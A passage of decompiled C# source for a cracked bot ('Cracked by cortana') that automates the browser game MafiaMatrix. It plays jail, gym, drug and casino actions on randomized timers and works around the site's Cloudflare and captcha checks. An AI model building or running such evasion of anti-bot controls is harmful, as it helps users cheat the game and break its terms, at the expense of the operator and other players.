				GeckoElement documentElement = this.geckoOther.Document.DocumentElement;
				if (documentElement is GeckoHtmlElement)
				{
					strSource = ((GeckoHtmlElement)documentElement).InnerHtml;
				}
				string between = this.getBetween(strSource, "<div id=\"success\">", "</div>");
				string between2 = this.getBetween(strSource, "<div id=\"fail\">", "</div>");
				string between3 = this.getBetween(strSource, "<title>MafiaMatrix - ", "</title>");
				if (between3 == "")
				{
					result = between3;
				}
				else if (between2 != "")
				{
					result = between2;
				}
				else
				{
					result = between;
				}
			}
			catch (Exception)
			{
				throw;
			}
			return result;
		}

		// Token: 0x0600004A RID: 74
		private void btnStartJailGym_Click(object sender, EventArgs e)
		{
			DateTime now = DateTime.Now;
			this.jailGymTxt.AppendText(string.Concat(new string[]
			{
				"[",
				DateTime.Now.ToLongTimeString(),
				"] ",
				this.jailGym(),
				"\n"
			}));
		}

		// Token: 0x0600004B RID: 75
		private void btnStopJailEarn_Click(object sender, EventArgs e)
		{
			this.jailEarnTimer.Stop();
		}

		// Token: 0x0600004C RID: 76
		private void btnStopJailGym_Click(object sender, EventArgs e)
		{
			this.jailGymTimer.Stop();
		}

		// Token: 0x0600004D RID: 77
		private async void btnStartCasino_Click(object sender, EventArgs e)
		{
			this.stopCasino = false;
			string uri = this.casino();
			int i = 0;
			while (i <= 110 && !this.stopCasino)
			{
				string result = this.casino2(uri);
				this.casinoTxt.AppendText(result + "\n");
				this.casinoTxt.ScrollToCaret();
				if (result == "Cloudfare")
				{
					await this.PutTaskDelay();
				}
				if (result == "Random")
				{
					break;
				}
				result = null;
				result = null;
				i++;
			}
		}

		// Token: 0x0600004E RID: 78
		public string drugUnit()
		{
			string result;
			try
			{
				string urltoGoTo = "https://mafiamatrix.com/income/manufacture.asp";
				string postdata = string.Format("action={0}", "Yes");
				this.NavigateWithPostDataOther(urltoGoTo, postdata);
				string strSource = string.Empty;
				GeckoElement documentElement = this.geckoOther.Document.DocumentElement;
				if (documentElement is GeckoHtmlElement)
				{
					strSource = ((GeckoHtmlElement)documentElement).InnerHtml;
				}
				string between = this.getBetween(strSource, "<div id=\"success\">", "</div>");
				string between2 = this.getBetween(strSource, "<div id=\"fail\">", "</div>");
				string between3 = this.getBetween(strSource, "<title>MafiaMatrix - ", "</title>");
				if (between3 == "Random")
				{
					result = between + "Please Fill In Captcha";
				}
				else if (between3 == "")
				{
					result = between + " Cloudfare";
				}
				else if (between != "")
				{
					result = between;
				}
				else
				{
					result = between2;
				}
			}
			catch (Exception)
			{
				throw;
			}
			return result;
		}

		// Token: 0x0600004F RID: 79
		public string jailEarn(string earnString)
		{
			string result;
			try
			{
				this.renewList();
				this.jailEarnTimer.Stop();
				this.stopAllTimer("jailEarn");
				bool flag = false;
				string text = "https://mafiamatrix.com/jail/duties.asp";
				string strSource = string.Empty;
				this.NavigateFinishEarn(text);
				GeckoElement documentElement = this.geckoEarn.Document.DocumentElement;
				if (documentElement is GeckoHtmlElement)
				{
					strSource = ((GeckoHtmlElement)documentElement).InnerHtml;
				}
				string between = this.getBetween(strSource, "<title>MafiaMatrix - ", "</title>");
				if (between == "Massive Multiplayer Online Text-Based RPG Mafia Game")
				{
					this.relogin();
				}
				if (between == "")
				{
					this.jailEarnTimer.Stop();
					int interval = new Random().Next(15000, 20000);
					this.jailEarnTimer.Interval = interval;
					this.jailEarnTimer.Start();
					this.jailEarnStartTime = DateTime.Now;
					this.startAllTimer("jailEarn");
					result = "Cloudfare bypassed.";
				}
				else
				{
					while (between == "Random")
					{
						this.solveRandom();
						this.NavigateFinishEarn("https://mafiamatrix.com/main.asp");
						flag = true;
						GeckoElement documentElement2 = this.geckoEarn.Document.DocumentElement;
						if (documentElement2 is GeckoHtmlElement)
						{
							string innerHtml2 = ((GeckoHtmlElement)documentElement2).InnerHtml;
							between = this.getBetween(innerHtml2, "<title>MafiaMatrix - ", "</title>");
							if (between != "Random")
							{
								this.jailEarnTxt.AppendText("Captcha bypassed! \n");
							}
						}
					}
					if (flag)
					{
						this.NavigateFinishEarn(text);
					}
					strSource = string.Empty;
					documentElement = this.geckoEarn.Document.DocumentElement;
					if (documentElement is GeckoHtmlElement)
					{
						strSource = ((GeckoHtmlElement)documentElement).InnerHtml;
					}
					string between2 = this.getBetween(strSource, "<input name=\"rndcnt\" value=\"", "\"");
					text = "https://mafiamatrix.com/jail/duty.asp";
					string postdata = string.Format("job={0}&rndcnt={1}", this.txtJailEarn.Text, between2);
					this.NavigateWithPostDataEarn(text, postdata);
					string strSource2 = string.Empty;
					GeckoElement documentElement3 = this.geckoEarn.Document.DocumentElement;
					if (documentElement3 is GeckoHtmlElement)
					{
						strSource2 = ((GeckoHtmlElement)documentElement3).InnerHtml;
					}
					string between3 = this.getBetween(strSource2, "<div id=\"success\">", "</div>");
					string between4 = this.getBetween(strSource2, "<div id=\"fail\">", "</div>");
					between = this.getBetween(strSource2, "<title>MafiaMatrix - ", "</title>");
					if (between == "Random")
					{
						while (between == "Random")
						{
							this.solveRandom();
							this.NavigateFinishEarn("https://mafiamatrix.com/main.asp");
							GeckoElement documentElement4 = this.geckoEarn.Document.DocumentElement;
							if (documentElement4 is GeckoHtmlElement)
							{
								string innerHtml3 = ((GeckoHtmlElement)documentElement4).InnerHtml;
								between = this.getBetween(innerHtml3, "<title>MafiaMatrix - ", "</title>");
								if (between != "Random")
								{
									this.jailEarnTxt.AppendText("Captcha bypassed! \n");
								}
							}
						}
					}
					string timer = this.getTimer("Earn");
					DateTime serverTime = this.getServerTime();
					if (!string.IsNullOrEmpty(timer))
					{
						DateTime dateTime;
						if (!DateTime.TryParseExact(timer, "G", null, DateTimeStyles.None, out dateTime))
						{
							this.jailEarnTimer.Stop();
							this.earnCount--;
							int interval2 = new Random().Next(180000, 186000);
							this.jailEarnTimer.Interval = interval2;
							this.jailEarnTimer.Start();
							this.jailEarnStartTime = DateTime.Now;
							this.startAllTimer("jailEarn");
							result = "Something wrong trying back in a few minutes.";
						}
						else
						{
							TimeSpan timeSpan = dateTime.Subtract(serverTime);
							Random random3 = new Random();
							int num = random3.Next(500, Convert.ToInt32(this.txtJailEarnRandom.Text) * 1000);
							int num2 = (int)timeSpan.TotalMilliseconds + num;
							if (num2 < 0)
							{
								num2 = random3.Next(5000, 10000);
							}
							if (random3.Next(1, 15) == 6)
							{
								num2 += random3.Next(60000, 240000);
							}
							this.jailEarnTimer.Interval = num2;
							this.jailEarnTimer.Start();
							this.jailEarnStartTime = DateTime.Now;
							this.startAllTimer("jailEarn");
							if (between3 != null)
							{
								result = between3;
							}
							else
							{
								result = between4;
							}
						}
					}
					else
					{
						this.jailEarnTimer.Stop();
						this.earnCount--;
						int interval3 = new Random().Next(180000, 186000);
						this.jailEarnTimer.Interval = interval3;
						this.jailEarnTimer.Start();
						this.jailEarnStartTime = DateTime.Now;
						this.startAllTimer("jailEarn");
						result = "Something wrong trying back in a few minutes.";
					}
				}
			}
			catch (Exception)
			{
				this.jailEarnTimer.Stop();
				this.earnCount--;
				int interval4 = new Random().Next(180000, 186000);
				this.jailEarnTimer.Interval = interval4;
				this.jailEarnTimer.Start();
				this.jailEarnStartTime = DateTime.Now;
				this.startAllTimer("jailEarn");
				result = "Something wrong trying back in a few minutes.";
			}
			return result;
		}

		// Token: 0x06000050 RID: 80
		public string jailGym()
		{
			string result;
			try
			{
				this.renewList();
				this.jailGymTimer.Stop();
				this.stopAllTimer("jailGym");
				string urltoGoTo = "https://mafiamatrix.com/jail/contra.asp";
				string postdata = string.Format("option={0}", "gym");
				this.NavigateWithPostDataOther(urltoGoTo, postdata);
				string strSource = string.Empty;
				GeckoElement documentElement = this.geckoOther.Document.DocumentElement;
				if (documentElement is GeckoHtmlElement)
				{
					strSource = ((GeckoHtmlElement)documentElement).InnerHtml;
				}
				string between = this.getBetween(strSource, "<div id=\"success\">", "</div>");
				string between2 = this.getBetween(strSource, "<div id=\"fail\">", "</div>");
				string between3 = this.getBetween(strSource, "<title>MafiaMatrix - ", "</title>");
				if (between3 == "Random")
				{
					this.solveRandom();
					int interval = new Random().Next(15000, 20000);
					this.jailGymTimer.Interval = interval;
					this.jailGymTimer.Start();
					this.jailGymStartTime = DateTime.Now;
					this.startAllTimer("jailGym");
					result = "Captcha";
				}
				else if (between3 == "")
				{
					int interval2 = new Random().Next(15000, 20000);
					this.jailGymTimer.Interval = interval2;
					this.jailGymTimer.Start();
					this.jailGymStartTime = DateTime.Now;
					this.startAllTimer("jailGym");
					result = "Cloudfare";
				}
				else
				{
					int interval3 = new Random().Next(600000, 610000);
					this.jailGymTimer.Interval = interval3;
					this.jailGymTimer.Start();
					this.startAllTimer("jailGym");
					this.jailGymStartTime = DateTime.Now;
					if (between != null)
					{
						result = between;
					}
					else
					{
						result = between2;
					}
				}
			}
			catch (Exception)
			{
				int interval4 = new Random().Next(600000, 610000);
				this.jailGymTimer.Interval = interval4;
				this.jailGymTimer.Start();
				this.startAllTimer("jailGym");
				this.jailGymStartTime = DateTime.Now;
				result = "Something is wrong";
			}
			return result;
		}

		// Token: 0x06000051 RID: 81
		private void jailEarnTimer_Tick(object sender, EventArgs e)
		{
			DateTime now = DateTime.Now;
			string text = this.txtJailEarn.Text;
			this.jailEarnTxt.AppendText(string.Concat(new string[]
			{
				"[",
				DateTime.Now.ToLongTimeString(),
				"] ",
				this.jailEarn(text),
				"\n"
			}));
			if (DateTime.Now > this.dtpLogOffTime.Value)
			{
				this.NavigateFinishMain("https://mafiamatrix.com/default.asp?action=logout");
				this.stopAllTimer("");
				Application.ExitThread();
				Application.Exit();
				Environment.Exit(1);
			}
		}

		// Token: 0x06000052 RID: 82
		private void jailGymTimer_Tick(object sender, EventArgs e)
		{
			DateTime now = DateTime.Now;
			this.jailGymTxt.AppendText(string.Concat(new string[]
			{
				"[",
				DateTime.Now.ToLongTimeString(),
				"] ",
				this.jailGym(),
				"\n"
			}));
		}

		// Token: 0x06000053 RID: 83
		private void btnStop_Click(object sender, EventArgs e)
		{
			this.stopAllTimer("");
			Application.ExitThread();
			Application.Exit();
			Environment.Exit(1);
		}

		// Token: 0x06000054 RID: 84
		private void btnDW_Click(object sender, EventArgs e)
		{
			string urltoGoTo = "https://mafiamatrix.com/income/charskills.asp";
			string postdata = string.Format("skill={0}&rank={1}&target={2}&doskill={3}", new object[]
			{
				"skill_fastearns",
				"1",
				this.txtCharName.Text,
				"Motivate!"
			});
			this.NavigateWithPostDataEarn(urltoGoTo, postdata);
		}

		// Token: 0x06000055 RID: 85
		private void Form1_Load(object sender, EventArgs e)
		{
			this.Casino.TabPages.Remove(this.tabPageEarn);
			this.Casino.TabPages.Remove(this.tabPageCrime);
			this.Casino.TabPages.Remove(this.tabPageCS);
			this.Casino.TabPages.Remove(this.tabPageDrug);
			this.Casino.TabPages.Remove(this.tabPageJail);
			this.Casino.TabPages.Remove(this.tabPageCasino);
			this.Casino.TabPages.Remove(this.tabPageGeckoEarn);
			this.Casino.TabPages.Remove(this.tabPageGeckoCrime);
			this.Casino.TabPages.Remove(this.tabPageGeckoOther);
			this.Casino.TabPages.Remove(this.tabPageGeckoCasino);
			string text = "Discord Cortana#7014";
			string title = "Cracked by cortana";
			MessageBox.Show(text, title);
			Process.Start("https://imgur.com/vNJOsaE");
			this.txtEmail.Text = ConfigurationManager.AppSettings["Email"].ToString();
			this.txtPassword.Text = ConfigurationManager.AppSettings["Password"].ToString();
		}

		// Token: 0x06000056 RID: 86
		private void btnEarnStop_Click(object sender, EventArgs e)
		{
			this.earnTimer.Stop();
			this.earnTimer.Enabled = false;
		}

		// Token: 0x06000057 RID: 87
		private void btnStopCasino_Click(object sender, EventArgs e)
		{
			this.stopCasino = true;
		}

		// Token: 0x06000058 RID: 88
		public string casino()
		{
			string text = "https://mafiamatrix.com/localcity/casino.asp";
			string postdata = string.Format("casinooption={0}", "slot");
			this.NavigateWithPostDataCasino(text, postdata);
			return text;
		}

		// Token: 0x06000059 RID: 89
		private void chkBoxJP_CheckedChanged(object sender, EventArgs e)
		{
			if (!this.jackpot)
			{
				this.jackpot = true;
				return;
			}
			this.jackpot = false;
		}

		// Token: 0x0600005A RID: 90
		private void chkBoxCrime_CheckedChanged(object sender, EventArgs e)
		{
			if (!this.secondCrime)
			{
				this.secondCrime = true;
				return;
			}
			this.secondCrime = false;
		}

		// Token: 0x0600005B RID: 91
		public string casino2(string uriString)
		{
			string postdata = string.Format("bet={0}&action={1}&casinooption={2}", "100", "Casino", "slot2");
			this.NavigateWithPostDataCasino(uriString, postdata);
			string strSource = string.Empty;
			GeckoElement documentElement = this.geckoCasino.Document.DocumentElement;
			if (documentElement is GeckoHtmlElement)
			{
				strSource = ((GeckoHtmlElement)documentElement).InnerHtml;
			}
			string between = this.getBetween(strSource, "<div id=\"success\">", "</div>");
			string between2 = this.getBetween(strSource, "<div id=\"fail\">", "</div>");
			string between3 = this.getBetween(strSource, "<title>MafiaMatrix - ", "</title>");
			string result;
			if (between3 == "Random")
			{
				result = between3;
			}
			else if (between3 == "")
			{
				result = "Cloudfare";
			}
			else if (between != null)
			{
				result = between;
			}
			else
			{
				result = between2;
			}
			return result;
		}

		// Token: 0x0600005C RID: 92
		private void geckoMain_Load(object sender, DomEventArgs e)
		{
			GeckoWebBrowser browser = new GeckoWebBrowser();
			browser.Load += delegate(object senderr, DomEventArgs ee)
			{
				this.Controls.Add(browser);
			};
		}

		// Token: 0x0600005D RID: 93
		private void geckoMain_DocumentCompleted(object sender, GeckoDocumentCompletedEventArgs e)
		{
			this.txtMainURL.Text = this.geckoMain.Url.AbsoluteUri;
		}

		// Token: 0x0600005E RID: 94
		public List<string> excludeBurningBusiness(string htmlCode)
		{
			HtmlAgilityPack.HtmlDocument htmlDocument = new HtmlAgilityPack.HtmlDocument();
			htmlDocument.LoadHtml(htmlCode);
			List<string> list = new List<string>();
			try
			{
				foreach (HtmlNode htmlNode in ((IEnumerable<HtmlNode>)htmlDocument.DocumentNode.SelectNodes("//div[@class='maintenance']")))
				{
					foreach (HtmlNode htmlNode2 in ((IEnumerable<HtmlNode>)htmlNode.SelectNodes(".//h1")))
					{
						string innerText = htmlNode2.InnerText;
						list.Add(innerText);
					}
				}
			}
			catch (Exception)
			{
			}
			return list;
		}

		// Token: 0x0600005F RID: 95
		private async Task PutTaskDelay()
		{
			await Task.Delay(10000);
		}

		// Token: 0x06000060 RID: 96
		private void WaitNSeconds(int seconds)
		{
			this.txtLastAction.Text = "Waiting for Cloudfare";
			if (seconds >= 1)
			{
				DateTime t = DateTime.Now.AddSeconds((double)seconds);
				while (DateTime.Now < t)
				{
					Thread.Sleep(1);
					Application.DoEvents();
				}
			}
		}

		// Token: 0x04000007 RID: 7
		private bool doingCaptcha;

		// Token: 0x04000008 RID: 8
		private int earnCount;

		// Token: 0x04000009 RID: 9
		private int drugCount;

		// Token: 0x0400000A RID: 10
		private int aggCount;

		// Token: 0x0400000B RID: 11
		private int csCount;

		// Token: 0x0400000C RID: 12
		private int repairCount;

		// Token: 0x0400000D RID: 13
		private int bmCount;

		// Token: 0x0400000E RID: 14
		private int dirtyMoney;

		// Token: 0x0400000F RID: 15
		private int bmHold;

		// Token: 0x04000010 RID: 16
		private string aggUrl;

		// Token: 0x04000011 RID: 17
		private string crimeType;

		// Token: 0x04000012 RID: 18
		private string payback1;

		// Token: 0x04000013 RID: 19
		private string payback2;

		// Token: 0x04000014 RID: 20
		private string paybackMessage;

		// Token: 0x04000015 RID: 21
		private bool alarm;

		// Token: 0x04000016 RID: 22
		private bool dw;

		// Token: 0x04000017 RID: 23
		private bool ape = true;

		// Token: 0x04000018 RID: 24
		private bool payback;

		// Token: 0x04000019 RID: 25
		private bool jackpot;

		// Token: 0x0400001A RID: 26
		private bool secondCrime;

		// Token: 0x0400001B RID: 27
		private bool stopCasino;

		// Token: 0x0400001C RID: 28
		private bool stopCrime;

		// Token: 0x0400001D RID: 29
		private List<string> timerToPause = new List<string>();

		// Token: 0x0400001E RID: 30
		private DateTime earnStartTime;

		// Token: 0x0400001F RID: 31
		private DateTime drugStartTime;

		// Token: 0x04000020 RID: 32
		private DateTime aggStartTime;

		// Token: 0x04000021 RID: 33
		private DateTime csStartTime;

		// Token: 0x04000022 RID: 34
		private DateTime repairStartTime;

		// Token: 0x04000023 RID: 35
		private DateTime dilligentStartTime;

		// Token: 0x04000024 RID: 36
		private DateTime bizStartTime;

		// Token: 0x04000025 RID: 37
		private DateTime jailEarnStartTime;

		// Token: 0x04000026 RID: 38
		private DateTime jailGymStartTime;

		// Token: 0x04000027 RID: 39
		private DateTime bmStartTime;

		// Token: 0x04000028 RID: 40
		private DateTime paybackStartTime;

		// Token: 0x04000029 RID: 41
		private DateTime relogStartTime;

		// Token: 0x0400002A RID: 42
		private DateTime stopAllTime;

		// Token: 0x0400002B RID: 43
		private TimeSpan earnTime;

		// Token: 0x0400002C RID: 44
		private TimeSpan drugTime;

		// Token: 0x0400002D RID: 45
		private TimeSpan aggTime;

		// Token: 0x0400002E RID: 46
		private TimeSpan csTime;

		// Token: 0x0400002F RID: 47
		private TimeSpan repairTime;

		// Token: 0x04000030 RID: 48
		private TimeSpan dilligentTime;

		// Token: 0x04000031 RID: 49
		private TimeSpan bizTime;

		// Token: 0x04000032 RID: 50
		private TimeSpan jailEarnTime;

		// Token: 0x04000033 RID: 51
		private TimeSpan jailGymTime;

		// Token: 0x04000034 RID: 52
		private TimeSpan bmTime;

		// Token: 0x04000035 RID: 53
		private TimeSpan paybackTime;

		// Token: 0x04000036 RID: 54
		private TimeSpan relogTime;
	}
}
